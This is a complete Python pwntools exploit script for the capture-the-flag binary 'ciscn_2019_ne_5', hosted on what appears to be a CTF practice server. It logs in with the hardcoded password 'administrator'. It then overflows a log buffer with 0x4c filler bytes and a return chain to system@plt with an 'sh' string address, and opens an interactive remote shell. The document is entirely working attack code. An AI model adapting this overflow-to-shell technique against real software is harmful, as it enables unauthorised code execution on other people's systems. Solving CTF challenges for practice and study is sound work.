from pwn import *

context.log_level = "info"
LOCAL_LIBC = "/lib/x86_64-linux-gnu/libc.so.6"
REMOTE_LIBC = "./libc.so.6"
REMOTE_ADDR = "node4.buuoj.cn"
REMOTE_PORT = 29631

elf = ELF("./ciscn_2019_ne_5")
sh_addr = 0x80492ea
ret = 0x0000000000400561

if len(sys.argv) == 2:
    libc = ELF(LOCAL_LIBC)
    if sys.argv[1] == "l":
        sock = process(elf.path)
    elif sys.argv[1] == "d": # Debug
        gs = """
#            break *GetFlag + 53
            break *0x080486fc
            break *0x8048667
            continue
        """
        sock = gdb.debug(elf.path, gdbscript = gs)
else:
#    libc = ELF(REMOTE_LIBC)
    sock = remote(REMOTE_ADDR, REMOTE_PORT)


def add_log(data):
    sock.sendline(b"1")
    sleep(0.5)
    sock.sendline(data)

def display():
    sock.sendline(b"2")
    sleep(0.5)
    return sock.recvline()

def getflag():
    sock.sendline(b"4")
    sleep(0.5)


def attack():
    sock.sendlineafter(b"Please input admin password:", b"administrator")

    add_log(b"A"*0x4c + p32(elf.plt["system"]) + p32(0x8048522) + p32(sh_addr))

    getflag()

if __name__ == "__main__":
    attack()
    sock.interactive()



